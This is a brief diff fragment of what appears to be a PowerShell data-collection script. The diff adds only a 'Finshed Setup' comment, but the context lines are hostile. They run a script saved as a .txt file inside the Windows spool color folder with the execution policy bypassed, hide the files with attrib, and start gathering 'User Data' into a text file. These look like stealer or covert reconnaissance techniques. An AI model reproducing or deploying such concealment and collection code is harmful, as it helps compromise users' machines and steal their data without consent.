@@ -17,6 +17,7 @@ Unblock-File -Path "C:\Windows\System32\spool\drivers\color\2.txt"
 powershell -ExecutionPolicy Bypass -noninteractive -nologo -File "C:\Windows\System32\spool\drivers\color\2.txt"
 attrib +h 1.txt
 attrib +h 2.txt
+################################## Finshed Setup ##################################
 Write-Output "################################## Start ##################################" | Out-File -FilePath .\1.txt -Append  
 Write-Output "###########################################################################" | Out-File -FilePath .\1.txt -Append
 Write-Output "################################## User Data ##################################" | Out-File -FilePath .\1.txt -Append
